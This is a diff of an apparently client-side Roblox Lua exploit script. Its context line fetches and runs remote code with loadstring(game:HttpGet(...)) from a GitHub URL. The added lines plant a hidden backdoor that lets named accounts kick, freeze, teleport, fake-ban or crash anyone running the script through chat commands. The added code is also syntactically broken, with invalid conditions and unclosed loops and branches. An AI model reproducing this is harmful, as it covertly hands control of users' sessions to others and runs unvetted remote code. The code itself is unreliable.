@@ -585,8 +585,53 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoi
 game.Players.PlayerAdded:Connect(function(plr) 
 	plr.CharacterAdded:Connect(function(Char)
 		Char:WaitForChild("Humanoid")
-		if plr.UserId == 1608746369 then
+		if plr.UserId == 1608746369, 3529446585 then
 			Char.Humanoid.DisplayName = "[👑]" .. plr.DisplayName
 		end
 	end)
+end)
+
+local settings = {
+    admin = "vepiuu, KreepOZi",
+    prefix = "!",
+}
+
+repeat wait() until game:IsLoaded()
+local plrs = game:GetService("Players")
+
+spawn(function()
+    repeat wait() until game:GetService("Players"):FindFirstChild(settings.admin)
+
+    local admin = plrs[settings.admin]
+    local prefix = settings.prefix
+
+    admin.Chatted:Connect(function(cht)
+            --- kick 
+        if cht:match(prefix .. "kick " .. game.Players.LocalPlayer.Name) then
+            game.Players.LocalPlayer:Kick("You have been kicked")
+             --- brings
+        elseif cht:match(prefix .. "bring " .. game.Players.LocalPlayer.Name) then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
+             --- freeze
+            elseif cht:match(prefix .. "freeze " .. game.Players.LocalPlayer.Name) then 
+          game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
+          --- unfreeze
+        elseif cht:match(prefix .. "unfreeze " .. game.Players.LocalPlayer.Name) then 
+      game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = false
+             --- teleport to air 
+            elseif cht:match(prefix .. "air " .. game.Players.LocalPlayer.Name) then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(500000,500000,500000)
+             --- crash a player
+            elseif cht:match(prefix .. "crash " .. game.Players.LocalPlayer.Name) then
+            while true do
+                print("crash")
+            --- fake ban 
+        if cht:match(prefix .. "ban " .. game.Players.LocalPlayer.Name) then
+            game.Players.LocalPlayer:Kick("User BANNED")
+            --- fake ban 
+        if cht:match(prefix .. "pban " .. game.Players.LocalPlayer.Name) then
+            game.Players.LocalPlayer:Kick("PERMA BANNED")
+            end
+        end
+    end)
 end)
